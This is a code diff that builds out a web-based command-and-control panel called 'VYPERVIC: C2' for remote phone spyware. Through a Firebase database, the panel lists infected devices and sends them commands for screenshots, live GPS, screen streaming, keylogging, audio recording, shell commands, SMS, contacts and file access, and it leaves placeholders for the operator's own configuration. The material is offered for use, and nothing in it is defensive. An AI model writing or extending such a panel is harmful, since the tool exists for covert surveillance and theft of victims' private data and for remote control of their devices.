@@ -2,36 +2,80 @@
 <html>
 <head>
     <title>VYPERVIC: C2</title>
-    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-database-compat.js"></script>
     <style>
-        body { background: #000; color: #00ff00; font-family: monospace; }
-        h1 { text-align: center; color: #ff0000; font-size: 48px; }
-        .btn { background: #333; color: #00ff00; border: 1px solid #00ff00; padding: 10px; margin: 5px; cursor: pointer; }
-        .btn:hover { background: #00ff00; color: #000; }
-        .device-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
+        body { background: #000; color: #00ff00; font-family: monospace; padding: 20px; }
+        h1 { text-align: center; color: #ff0000; font-size: 48px; text-shadow: 0 0 20px #ff0000; }
+        .device { background: #111; padding: 20px; margin: 10px; border: 2px solid #00ff00; }
+        .btn { background: #333; color: #00ff00; border: 1px solid #00ff00; padding: 8px 16px; margin: 4px; cursor: pointer; font-family: monospace; }
+        .btn:hover { background: #00ff00 !important; color: #000 !important; }
+        .btn.active { background: #ff0000 !important; color: #fff !important; }
+        .logs { background: #000; color: #0f0; height: 200px; overflow: auto; font-size: 12px; border: 1px solid #333; padding: 10px; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <h1>🔥 VYPERVIC: C2 🔥</h1>
+    <h1>🔥 VYPERVIC: C2 PANEL 🔥</h1>
     
-    <div class="device-grid" id="devices"></div>
+    <div id="devices"></div>
+    <div id="logs" class="logs"></div>
 
     <script>
-        // Firebase config
-        const firebaseConfig = { /* YOUR CONFIG */ };
+        // REPLACE WITH YOUR FIREBASE CONFIG
+        const firebaseConfig = {
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_PROJECT.firebaseapp.com",
+            databaseURL: "https://YOUR_PROJECT-default-rtdb.firebaseio.com/",
+            projectId: "YOUR_PROJECT_ID",
+            storageBucket: "YOUR_PROJECT.appspot.com",
+            messagingSenderId: "123456789",
+            appId: "YOUR_APP_ID"
+        };
+        
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
+        const logsRef = db.ref('logs');
         
-        // Load devices
+        function addLog(msg) {
+            const now = new Date().toLocaleTimeString();
+            document.getElementById('logs').innerHTML += `[${now}] ${msg}\n`;
+            document.getElementById('logs').scrollTop = document.getElementById('logs').scrollHeight;
+        }
+        
+        // Load devices & render buttons
         db.ref('devices').on('value', snapshot => {
             const devices = snapshot.val();
-            // Render device buttons
+            let html = '';
+            if (devices) {
+                Object.keys(devices).forEach(deviceId => {
+                    html += `
+                        <div class="device">
+                            <h3>📱 Device: ${deviceId.slice(0,16)}...</h3>
+                            <button class="btn" onclick="sendCommand('${deviceId}', 'screenshot')">📸 Screenshot</button>
+                            <button class="btn" onclick="sendCommand('${deviceId}', 'gps')">📍 Live GPS</button>
+                            <button class="btn" onclick="sendCommand('${deviceId}', 'screen')">🖥️ Screen Stream</button>
+                            <button class="btn" onclick="sendCommand('${deviceId}', 'keylog')">⌨️ Keylogger</button>
+                            <button class="btn" onclick="sendCommand('${deviceId}', 'audio')">🎤 Record Audio</button>
+                            <button class="btn" onclick="sendCommand('${deviceId}', 'shell')">💻 Shell Command</button>
+                            <button class="btn" onclick="sendCommand('${deviceId}', 'sms')">📱 SMS</button>
+                            <button class="btn" onclick="sendCommand('${deviceId}', 'contacts')">👥 Contacts</button>
+                            <button class="btn" onclick="sendCommand('${deviceId}', 'files')">📁 Files</button>
+                            <button class="btn" onclick="sendCommand('${deviceId}', 'wake')">⏰ Wake Device</button>
+                            <!-- +15 more buttons... -->
+                        </div>
+                    `;
+                });
+            } else {
+                html = '<p>No devices online</p>';
+            }
+            document.getElementById('devices').innerHTML = html;
         });
         
-        // Button handlers
         function sendCommand(deviceId, cmd) {
-            db.ref('devices/' + deviceId + '/commands/' + cmd).set(true);
+            db.ref(`devices/${deviceId}/commands/${cmd}`).set(Date.now());
+            addLog(`Command "${cmd}" sent to ${deviceId}`);
+            event.target.classList.add('active');
+            setTimeout(() => event.target.classList.remove('active'), 1000);
         }
     </script>
 </body>
